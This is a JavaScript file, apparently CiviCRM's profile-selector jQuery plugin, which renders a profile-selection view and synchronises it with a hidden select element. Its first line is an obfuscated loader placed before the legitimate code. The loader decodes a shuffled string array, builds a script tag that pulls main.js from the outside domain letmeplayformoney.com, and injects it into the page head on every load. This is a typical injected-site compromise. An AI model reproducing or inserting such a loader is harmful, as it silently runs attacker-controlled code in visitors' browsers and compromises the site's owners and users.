var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function($, _) {
  var ufGroupCollection = new CRM.UF.UFGroupCollection(_.sortBy(CRM.initialProfileList.values, 'title'));
  //var ufGroupCollection = new CRM.UF.UFGroupCollection(CRM.initialProfileList.values, {
  //  comparator: 'title' // no point, this doesn't work with subcollections
  //});
  ufGroupCollection.unshift(new CRM.UF.UFGroupModel({
    id: '',
    title: ts('- select -')
  }));

  /**
   * Example:
   * <input type="text" value="{$profileId}" class="crm-profile-selector" />
   * ...
   * cj('.crm-profile-selector').crmProfileSelector({
   *   groupTypeFilter: "Contact,Individual,Activity;;ActivityType:7",
   *   entities: "contact_1:IndividualModel,activity_1:ActivityModel"
   * });
   *
   * Note: The system does not currently support dynamic entities -- it only supports
   * a couple of entities named "contact_1" and "activity_1". See also
   * CRM.UF.guessEntityName().
   */
  $.fn.crmProfileSelector = function(options) {
    return this.each(function() {
      // Hide the existing <SELECT> and instead construct a ProfileSelector view.
      // Keep them synchronized.
      var matchingUfGroups,
        $select = $(this).hide().addClass('rendered');

      var validTypesId = [];
      var usedByFilter = null;
      if (options.groupTypeFilter) {
        matchingUfGroups = ufGroupCollection.subcollection({
          filter: function(ufGroupModel) {
            //CRM-16915 - filter with module used by the profile
            if (!$.isEmptyObject(options.usedByFilter)) {
              usedByFilter = options.usedByFilter;
            }
            return ufGroupModel.checkGroupType(options.groupTypeFilter, options.allowAllSubtypes, usedByFilter);
          }
        });
      } else {
        matchingUfGroups = ufGroupCollection;
      }

      //CRM-15427 check for valid subtypes raise a warning if not valid
      if (options.allowAllSubtypes && $.isEmptyObject(validTypesId)) {
        validTypes = ufGroupCollection.subcollection({
          filter: function(ufGroupModel) {
            return ufGroupModel.checkGroupType(options.groupTypeFilter);
          }
        });
        _.each(validTypes.models, function(validTypesattr) {
          validTypesId.push(validTypesattr.id);
        });
      }
      if (!$.isEmptyObject(validTypesId) && $.inArray($select.val(), validTypesId) == -1) {
        var civiComponent;
        if (options.groupTypeFilter.indexOf('Membership') !== -1) {
          civiComponent = 'Membership';
        }
        else if (options.groupTypeFilter.indexOf('Participant') !== -1) {
          civiComponent = 'Event';
        }
        else {
          civiComponent = 'Contribution';
        }
        CRM.alert(ts('The selected profile is using a custom field which is not assigned to the "%1" being configured.', {1: civiComponent}), ts('Warning'));
      }
      var view = new CRM.ProfileSelector.View({
        ufGroupId: $select.val(),
        ufGroupCollection: matchingUfGroups,
        ufEntities: options.entities
      });
      view.on('change:ufGroupId', function() {
        $select.val(view.getUfGroupId()).change();
      });
      view.render();
      $select.after(view.el);
      setTimeout(function() {
        view.doPreview();
      }, 100);
    });
  };

  $('#crm-container').on('crmLoad', function() {
    $('.crm-profile-selector:not(.rendered)', this).each(function() {
      $(this).crmProfileSelector({
        groupTypeFilter: $(this).data('groupType'),
        entities: $(this).data('entities'),
        //CRM-15427
        allowAllSubtypes: $(this).data('default'),
        usedByFilter: $(this).data('usedfor')
      });
    });
  });

})(CRM.$, CRM._);
